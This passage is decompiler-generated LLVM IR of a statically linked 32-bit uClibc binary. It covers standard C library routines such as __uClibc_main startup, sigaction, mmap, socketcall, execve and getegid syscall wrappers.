dec_label_pc_8055553:                             ; preds = %entry, %dec_label_pc_805553a, %dec_label_pc_805554e
  %v2_8055553 = load i32, i32* %stack_var_-12, align 4
  %v2_8055554 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055554, i32* @ebx, align 4
  store i32 %v0_8055523, i32* @esi, align 4
  ret i32 %v2_8055553

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055553, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_805555a = load i8, i8* @global_var_806573c.999, align 4
  %v1_805555a = icmp eq i8 %v0_805555a, 0
  %v1_8055561 = icmp eq i1 %v1_805555a, false
  br i1 %v1_8055561, label %entry.dec_label_pc_8055593_crit_edge, label %dec_label_pc_8055563

entry.dec_label_pc_8055593_crit_edge:             ; preds = %entry
  %v0_8055596.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8055593

dec_label_pc_8055563:                             ; preds = %entry
  store i8 1, i8* @global_var_806573c.999, align 4
  store i32 4096, i32* @global_var_8065730.1000, align 16
  %v0_805558e = call i32 @_stdio_init()
  br label %dec_label_pc_8055593

dec_label_pc_8055593:                             ; preds = %entry.dec_label_pc_8055593_crit_edge, %dec_label_pc_8055563
  %v0_8055596 = phi i32 [ %v0_8055596.pre, %entry.dec_label_pc_8055593_crit_edge ], [ %v0_805558e, %dec_label_pc_8055563 ]
  ret i32 %v0_8055596

; uselistorder directives
  uselistorder i8* @global_var_806573c.999, { 1, 0 }
  uselistorder label %dec_label_pc_8055593, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8065728.1001, align 8
  store i32 %arg6, i32* @global_var_8065738.997, align 8
  %v2_80555ce = mul i32 %arg2, 4
  %v3_80555ce = add i32 %tmp29, %v2_80555ce
  %v1_80555d1 = add i32 %v3_80555ce, 4
  store i32 %v1_80555d1, i32* %edx.global-to-local, align 4
  store i32 %v1_80555d1, i32* @global_var_806572c.992, align 4
  %v3_80555da = load i32, i32* %arg3, align 4
  %v14_80555da = icmp eq i32 %v1_80555d1, %v3_80555da
  store i32 0, i32* %stack_var_-168, align 4
  %v1_80555e0 = icmp eq i1 %v14_80555da, false
  %v4_80555e0 = select i1 %v1_80555e0, i32 %v1_80555d1, i32 %v3_80555ce
  store i32 %v4_80555e0, i32* @global_var_806572c.992, align 4
  %v2_80555e8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80555ed = bitcast i32* %stack_var_-136 to i8*
  %v4_80555ed = call i32 @__GI_memset(i8* %v3_80555ed, i32 0, i32 120)
  %v0_80555f2 = load i32, i32* @global_var_806572c.992, align 4
  br label %dec_label_pc_80555fa

dec_label_pc_80555fa:                             ; preds = %dec_label_pc_80555fa, %entry
  %v0_80555fa = phi i32 [ %v1_80555fd, %dec_label_pc_80555fa ], [ %v0_80555f2, %entry ]
  %v1_80555fa = inttoptr i32 %v0_80555fa to i32*
  %v2_80555fa = load i32, i32* %v1_80555fa, align 4
  %v3_80555fa = icmp eq i32 %v2_80555fa, 0
  %v1_80555fd = add i32 %v0_80555fa, 4
  %v1_8055600 = icmp eq i1 %v3_80555fa, false
  br i1 %v1_8055600, label %dec_label_pc_80555fa, label %dec_label_pc_8055621.preheader

dec_label_pc_8055621.preheader:                   ; preds = %dec_label_pc_80555fa
  store i32 %v1_80555fd, i32* @ebx, align 4
  %v1_80556211 = inttoptr i32 %v1_80555fd to i32*
  %v2_80556212 = load i32, i32* %v1_80556211, align 4
  %v3_80556213 = icmp eq i32 %v2_80556212, 0
  %v1_805562410 = icmp eq i1 %v3_80556213, false
  br i1 %v1_805562410, label %dec_label_pc_8055606.lr.ph, label %dec_label_pc_8055626

dec_label_pc_8055606.lr.ph:                       ; preds = %dec_label_pc_8055621.preheader
  %v3_80555de = ptrtoint i32* %stack_var_-168 to i32
  %v3_8055611 = add i32 %v3_80555de, 32
  br label %dec_label_pc_8055606

dec_label_pc_8055606:                             ; preds = %dec_label_pc_8055606.lr.ph, %dec_label_pc_805561e
  %v1_8055611 = phi i32 [ %v2_80556212, %dec_label_pc_8055606.lr.ph ], [ %v2_8055621, %dec_label_pc_805561e ]
  %v0_8055610 = phi i32 [ %v1_80555fd, %dec_label_pc_8055606.lr.ph ], [ %v1_805561e, %dec_label_pc_805561e ]
  %v6_805560b = icmp ugt i32 %v1_8055611, 14
  br i1 %v6_805560b, label %dec_label_pc_805561e, label %dec_label_pc_805560d

dec_label_pc_805560d:                             ; preds = %dec_label_pc_8055606
  %v0_805560d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805560d, i32* %stack_var_-160, align 4
  store i32 %v0_8055610, i32* %stack_var_-168, align 4
  %v2_8055611 = mul i32 %v1_8055611, 8
  %v4_8055611 = add i32 %v3_8055611, %v2_8055611
  %v3_8055616 = inttoptr i32 %v4_8055611 to i16*
  %v4_8055616 = call i32 @memcpy(i16* %v3_8055616, i32 %v0_8055610, i32 8)
  %v0_805561e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805561e

dec_label_pc_805561e:                             ; preds = %dec_label_pc_8055606, %dec_label_pc_805560d
  %v0_805561e = phi i32 [ %v0_8055610, %dec_label_pc_8055606 ], [ %v0_805561e.pre, %dec_label_pc_805560d ]
  %v1_805561e = add i32 %v0_805561e, 8
  store i32 %v1_805561e, i32* @ebx, align 4
  %v1_8055621 = inttoptr i32 %v1_805561e to i32*
  %v2_8055621 = load i32, i32* %v1_8055621, align 4
  %v3_8055621 = icmp eq i32 %v2_8055621, 0
  %v1_8055624 = icmp eq i1 %v3_8055621, false
  br i1 %v1_8055624, label %dec_label_pc_8055606, label %dec_label_pc_8055626

dec_label_pc_8055626:                             ; preds = %dec_label_pc_805561e, %dec_label_pc_8055621.preheader
  store i32 %v2_80555e8, i32* @eax, align 4
  %v0_805562a = call i32 @_dl_aux_init()
  store i32 %v0_805562a, i32* @eax, align 4
  %v0_805562f = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_805563d = icmp eq i32 %tmp24, 0
  %v3_805563f = select i1 %v1_805563d, i32 4096, i32 %tmp24
  %v13_8055642 = icmp eq i32 %tmp23, -1
  store i32 %v3_805563f, i32* @global_var_8065730.1000, align 16
  %v1_805564c = icmp eq i1 %v13_8055642, false
  br i1 %v1_805564c, label %dec_label_pc_8055677, label %dec_label_pc_805564e

dec_label_pc_805564e:                             ; preds = %dec_label_pc_8055626
  %v0_805564e = call i32 @getuid()
  store i32 %v0_805564e, i32* @ebx, align 4
  %v0_8055655 = call i32 @geteuid()
  %v0_805565a = load i32, i32* @ebx, align 4
  %v12_805565a = icmp eq i32 %v0_805565a, %v0_8055655
  %v1_805565c = icmp eq i1 %v12_805565a, false
  br i1 %v1_805565c, label %dec_label_pc_805568d, label %dec_label_pc_805565e

dec_label_pc_805565e:                             ; preds = %dec_label_pc_805564e
  %v0_805565e = call i32 @getgid()
  store i32 %v0_805565e, i32* @ebx, align 4
  %v0_8055665 = call i32 @getegid()
  %v0_805566a = load i32, i32* @ebx, align 4
  %v12_805566a = icmp eq i32 %v0_805566a, %v0_8055665
  %v1_805566c = icmp eq i1 %v12_805566a, false
  br i1 %v1_805566c, label %dec_label_pc_805568d, label %dec_label_pc_805566e.thread

dec_label_pc_805566e.thread:                      ; preds = %dec_label_pc_805565e
  br label %dec_label_pc_80556b7

dec_label_pc_8055677:                             ; preds = %dec_label_pc_8055626
  %v15_8055677 = icmp eq i32 %tmp23, %tmp22
  %v1_805567b = icmp eq i1 %v15_8055677, false
  br i1 %v1_805567b, label %dec_label_pc_805568d, label %dec_label_pc_805567d

dec_label_pc_805567d:                             ; preds = %dec_label_pc_8055677
  br label %dec_label_pc_805568d

dec_label_pc_805568d:                             ; preds = %dec_label_pc_805567d, %dec_label_pc_8055677, %dec_label_pc_805565e, %dec_label_pc_805564e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8055694 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80556a3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80556b2 = call i32 @__check_one_fd()
  br label %dec_label_pc_80556b7

dec_label_pc_80556b7:                             ; preds = %dec_label_pc_805566e.thread, %dec_label_pc_805568d
  %v0_80556b7 = load i32, i32* @edi, align 4
  %v1_80556b7 = inttoptr i32 %v0_80556b7 to i32*
  %v2_80556b7 = load i32, i32* %v1_80556b7, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_80556b7, i32* inttoptr (i32 134608024 to i32*), align 8
  store i32 %arg5, i32* @global_var_8065734.996, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 0), label %dec_label_pc_80556dc, label %dec_label_pc_80556e8

dec_label_pc_80556dc:                             ; preds = %dec_label_pc_80556b7, %dec_label_pc_80556dc
  %v4_80556dc52 = phi i32 [ %v1_80556e3, %dec_label_pc_80556dc ], [ 0, %dec_label_pc_80556b7 ]
  store i32 ptrtoint (i32* @global_var_80556e3.1003 to i32), i32* %stack_var_-160, align 4
  %v5_80556dc = mul i32 %v4_80556dc52, 4
  %v6_80556dc = add i32 %v5_80556dc, ptrtoint (i32* @global_var_805f000.994 to i32)
  %v7_80556dc = inttoptr i32 %v6_80556dc to i32*
  %v8_80556dc = load i32, i32* %v7_80556dc, align 4
  call void @__pseudo_call(i32 %v8_80556dc)
  %v0_80556e3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80556e3 = add i32 %v0_80556e3, 1
  store i32 %v1_80556e3, i32* %ebx.global-to-local, align 4
  %v1_80556e4 = load i32, i32* %esi.global-to-local, align 4
  %v7_80556e4 = icmp ult i32 %v1_80556e3, %v1_80556e4
  br i1 %v7_80556e4, label %dec_label_pc_80556dc, label %dec_label_pc_80556e8

dec_label_pc_80556e8:                             ; preds = %dec_label_pc_80556dc, %dec_label_pc_80556b7
  store i32 134567662, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 0), label %dec_label_pc_8055700, label %dec_label_pc_805570c

dec_label_pc_8055700:                             ; preds = %dec_label_pc_80556e8, %dec_label_pc_8055700
  %v4_805570042 = phi i32 [ %v1_8055707, %dec_label_pc_8055700 ], [ 0, %dec_label_pc_80556e8 ]
  store i32 ptrtoint (i32* @global_var_8055707.1004 to i32), i32* %stack_var_-160, align 4
  %v5_8055700 = mul i32 %v4_805570042, 4
  %v6_8055700 = add i32 %v5_8055700, ptrtoint (i32* @global_var_805f000.994 to i32)
  %v7_8055700 = inttoptr i32 %v6_8055700 to i32*
  %v8_8055700 = load i32, i32* %v7_8055700, align 4
  call void @__pseudo_call(i32 %v8_8055700)
  %v0_8055707 = load i32, i32* @ebx, align 4
  %v1_8055707 = add i32 %v0_8055707, 1
  store i32 %v1_8055707, i32* @ebx, align 4
  %v1_8055708.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8055708 = icmp ult i32 %v1_8055707, %v1_8055708.pre
  br i1 %v7_8055708, label %dec_label_pc_8055700, label %dec_label_pc_805570c

dec_label_pc_805570c:                             ; preds = %dec_label_pc_8055700, %dec_label_pc_80556e8
  %v0_8055715 = load i32, i32* %stack_var_-160, align 4
  %v1_8055715 = call i32 @__errno_location(i32 %v0_8055715)
  %v1_805571a = inttoptr i32 %v1_8055715 to i32*
  store i32 0, i32* %v1_805571a, align 4
  %v0_8055729 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055729, i32* @eax, align 4
  %v1_805572e = inttoptr i32 %v0_8055729 to i32*
  store i32 0, i32* %v1_805572e, align 4
  %v0_8055734 = load i32, i32* @eax, align 4
  store i32 %v0_8055734, i32* %stack_var_-160, align 4
  %v0_805573b = load i32, i32* @edi, align 4
  store i32 %v0_805573b, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_805574a = load i32, i32* @eax, align 4
  %v1_805574d = call i32 @__GI_exit(i32 %v0_805574a)
  %v0_8055759 = load i32, i32* @ebx, align 4
  %v1_8055759 = inttoptr i32 %v0_8055759 to %sigcontext*
  %v2_8055759 = call i32 @sigreturn(%sigcontext* %v1_8055759)
  %v0_8055761 = load i32, i32* @ebx, align 4
  %v1_8055761 = inttoptr i32 %v0_8055761 to %sigcontext*
  %v2_8055761 = call i32 @sigreturn(%sigcontext* %v1_8055761)
  ret i32 %v2_8055761

; uselistorder directives
  uselistorder i32 %v1_8055707, { 1, 2, 0 }
  uselistorder i32 %v1_80556e3, { 1, 2, 0 }
  uselistorder i32 %v2_8055621, { 1, 0 }
  uselistorder i32 %v1_805561e, { 2, 1, 0 }
  uselistorder i32 %v1_80555fd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80555fa, { 1, 0 }
  uselistorder i32 %v1_80555d1, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f000.994 to i32), i32 -134606848), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8055700, { 1, 0 }
  uselistorder label %dec_label_pc_80556dc, { 1, 0 }
  uselistorder label %dec_label_pc_80556b7, { 1, 0 }
  uselistorder label %dec_label_pc_805561e, { 1, 0 }
  uselistorder label %dec_label_pc_8055606, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8055763 = load i32, i32* @esi, align 4
  %v0_8055764 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055779 = icmp eq i32* %arg2, null
  br i1 %v1_8055779, label %dec_label_pc_80557cd, label %dec_label_pc_805577d

dec_label_pc_805577d:                             ; preds = %entry
  %v2_805577d = load i32, i32* %arg2, align 4
  store i32 %v2_805577d, i32* %stack_var_-148, align 4
  %v1_8055786 = add i32 %tmp11, 4
  %v3_8055798 = bitcast i32* %stack_var_-136 to i16*
  %v4_8055798 = call i32 @memcpy(i16* %v3_8055798, i32 %v1_8055786, i32 128)
  br label %dec_label_pc_80557cd

dec_label_pc_80557cd:                             ; preds = %entry, %dec_label_pc_805577d
  %v1_80557cf = icmp eq i32 %arg3, 0
  br i1 %v1_80557cf, label %dec_label_pc_80557d7, label %dec_label_pc_80557d3

dec_label_pc_80557d3:                             ; preds = %dec_label_pc_80557cd
  %v2_80557d3 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_80557d7

dec_label_pc_80557d7:                             ; preds = %dec_label_pc_80557cd, %dec_label_pc_80557d3
  %v0_80557e6 = phi i32 [ 0, %dec_label_pc_80557cd ], [ %v2_80557d3, %dec_label_pc_80557d3 ]
  br i1 %v1_8055779, label %dec_label_pc_80557e4, label %dec_label_pc_80557dd

dec_label_pc_80557dd:                             ; preds = %dec_label_pc_80557d7
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80557e4

dec_label_pc_80557e4:                             ; preds = %dec_label_pc_80557d7, %dec_label_pc_80557dd
  %v0_80557e7 = phi %sigaction* [ null, %dec_label_pc_80557d7 ], [ %phitmp, %dec_label_pc_80557dd ]
  %v5_80557ef = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80557e7, i32 %v0_80557e6, i32 8)
  store i32 %v5_80557ef, i32* %ebx.global-to-local, align 4
  br i1 %v1_80557cf, label %dec_label_pc_8055832, label %dec_label_pc_80557fd

dec_label_pc_80557fd:                             ; preds = %dec_label_pc_80557e4
  %v2_80557fd = icmp slt i32 %v5_80557ef, 0
  br i1 %v2_80557fd, label %dec_label_pc_8055832, label %dec_label_pc_8055801

dec_label_pc_8055801:                             ; preds = %dec_label_pc_80557fd
  %v3_8055801 = load i32, i32* %stack_var_-288, align 4
  %v2_8055805 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8055801, i32* %v2_8055805, align 4
  %v2_805580d = ptrtoint i32* %stack_var_-276 to i32
  %v1_8055812 = add i32 %arg3, 4
  %v3_8055816 = inttoptr i32 %v1_8055812 to i16*
  %v4_8055816 = call i32 @memcpy(i16* %v3_8055816, i32 %v2_805580d, i32 128)
  %v2_805581f = add i32 %arg3, 132
  %v3_805581f = inttoptr i32 %v2_805581f to i32*
  %v2_805582c = add i32 %arg3, 136
  %v3_805582c = inttoptr i32 %v2_805582c to i32*
  %v0_8055838.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055832

dec_label_pc_8055832:                             ; preds = %dec_label_pc_80557fd, %dec_label_pc_80557e4, %dec_label_pc_8055801
  %v0_8055838 = phi i32 [ %v5_80557ef, %dec_label_pc_80557fd ], [ %v5_80557ef, %dec_label_pc_80557e4 ], [ %v0_8055838.pre, %dec_label_pc_8055801 ]
  store i32 %v0_8055764, i32* @ebx, align 4
  store i32 %v0_8055763, i32* @esi, align 4
  ret i32 %v0_8055838

; uselistorder directives
  uselistorder i1 %v1_80557cf, { 1, 0 }
  uselistorder i1 %v1_8055779, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8055832, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80557e4, { 1, 0 }
  uselistorder label %dec_label_pc_80557d7, { 1, 0 }
  uselistorder label %dec_label_pc_80557cd, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8055843 = load i32, i32* @eax, align 4
  %v1_8055845 = sub i32 0, %v0_8055843
  %v1_8055847 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_805584c = inttoptr i32 %v1_8055847 to i32*
  store i32 %v1_8055845, i32* %v2_805584c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8055858 = load i32, i32* @ebx, align 4
  %v2_805585f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805585f, i32* @ebx, align 4
  %v8_8055863 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8055858, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8055863, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134568000)
  ret i32 %v8_8055863

; uselistorder directives
  uselistorder i32 %v8_8055863, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134568000, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055874 = load i32, i32* @ebx, align 4
  store i32 %v0_8055874, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8055887 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8055887, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055887, -4095
  br i1 %tmp, label %dec_label_pc_80558a0, label %dec_label_pc_8055894

dec_label_pc_8055894:                             ; preds = %entry
  %v0_8055894 = load i32, i32* %stack_var_-4, align 4
  %v1_8055894 = call i32 @__errno_location(i32 %v0_8055894)
  %v0_8055899 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055899 = sub i32 0, %v0_8055899
  %v2_805589b = inttoptr i32 %v1_8055894 to i32*
  store i32 %v1_8055899, i32* %v2_805589b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80558a0

dec_label_pc_80558a0:                             ; preds = %entry, %dec_label_pc_8055894
  %v0_80558a1 = phi i32 [ %v1_8055887, %entry ], [ -1, %dec_label_pc_8055894 ]
  %v2_80558a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80558a0, i32* @edx, align 4
  %v2_80558a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80558a4, i32* @ebx, align 4
  ret i32 %v0_80558a1

; uselistorder directives
  uselistorder i32 %v1_8055887, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80558a0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80558a9 = load i32, i32* @esi, align 4
  store i32 %v0_80558a9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80558bd = load i32, i32* @ebx, align 4
  %v7_80558c5 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80558c5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_80558c5, -4095
  br i1 %tmp, label %dec_label_pc_80558dd, label %dec_label_pc_80558d1

dec_label_pc_80558d1:                             ; preds = %entry
  %v1_80558d1 = call i32 @__errno_location(i32 %v0_80558bd)
  %v0_80558d6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80558d6 = sub i32 0, %v0_80558d6
  %v2_80558d8 = inttoptr i32 %v1_80558d1 to i32*
  store i32 %v1_80558d6, i32* %v2_80558d8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80558dd

dec_label_pc_80558dd:                             ; preds = %entry, %dec_label_pc_80558d1
  %v0_80558de = phi i32 [ %v7_80558c5, %entry ], [ -1, %dec_label_pc_80558d1 ]
  %v2_80558dd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80558dd, i32* @edx, align 4
  %v2_80558e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80558e0, i32* @esi, align 4
  ret i32 %v0_80558de

; uselistorder directives
  uselistorder i32 %v7_80558c5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80558dd, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80558e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80558e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80558f7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80558f7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80558f7, -4095
  br i1 %tmp, label %dec_label_pc_8055910, label %dec_label_pc_8055904

dec_label_pc_8055904:                             ; preds = %entry
  %v0_8055904 = load i32, i32* %stack_var_-4, align 4
  %v1_8055904 = call i32 @__errno_location(i32 %v0_8055904)
  %v0_8055909 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055909 = sub i32 0, %v0_8055909
  %v2_805590b = inttoptr i32 %v1_8055904 to i32*
  store i32 %v1_8055909, i32* %v2_805590b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055910

dec_label_pc_8055910:                             ; preds = %entry, %dec_label_pc_8055904
  %v0_8055911 = phi i32 [ %v4_80558f7, %entry ], [ -1, %dec_label_pc_8055904 ]
  %v2_8055910 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055910, i32* @edx, align 4
  %v2_8055914 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055914, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055911

; uselistorder directives
  uselistorder i32 %v4_80558f7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055910, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055918 = load i32, i32* @edi, align 4
  store i32 %v0_8055918, i32* %stack_var_-4, align 4
  %v4_805591c = ptrtoint i8* %arg1 to i32
  store i32 %v4_805591c, i32* %edi.global-to-local, align 4
  %v0_8055928 = load i32, i32* @ebx, align 4
  %v5_8055930 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8055930 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8055930 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8055930, [1 x i8*] %v8_8055930)
  store i32 %v9_8055930, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8055930, -4095
  br i1 %tmp12, label %dec_label_pc_8055948, label %dec_label_pc_805593c

dec_label_pc_805593c:                             ; preds = %entry
  %v1_805593c = call i32 @__errno_location(i32 %v0_8055928)
  %v0_8055941 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055941 = sub i32 0, %v0_8055941
  %v2_8055943 = inttoptr i32 %v1_805593c to i32*
  store i32 %v1_8055941, i32* %v2_8055943, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055948

dec_label_pc_8055948:                             ; preds = %entry, %dec_label_pc_805593c
  %v0_8055949 = phi i32 [ %v9_8055930, %entry ], [ -1, %dec_label_pc_805593c ]
  %v2_8055948 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055948, i32* @edx, align 4
  %v2_805594c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805594c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055949

; uselistorder directives
  uselistorder i32 %v9_8055930, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055948, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055950 = load i32, i32* @ebx, align 4
  store i32 %v0_8055950, i32* %stack_var_-4, align 4
  %v1_8055959 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055959, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055959, -4095
  br i1 %tmp, label %dec_label_pc_8055970, label %dec_label_pc_8055964

dec_label_pc_8055964:                             ; preds = %entry
  %v0_8055964 = load i32, i32* %stack_var_-4, align 4
  %v1_8055964 = call i32 @__errno_location(i32 %v0_8055964)
  %v0_8055969 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055969 = sub i32 0, %v0_8055969
  %v2_805596b = inttoptr i32 %v1_8055964 to i32*
  store i32 %v1_8055969, i32* %v2_805596b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055970

dec_label_pc_8055970:                             ; preds = %entry, %dec_label_pc_8055964
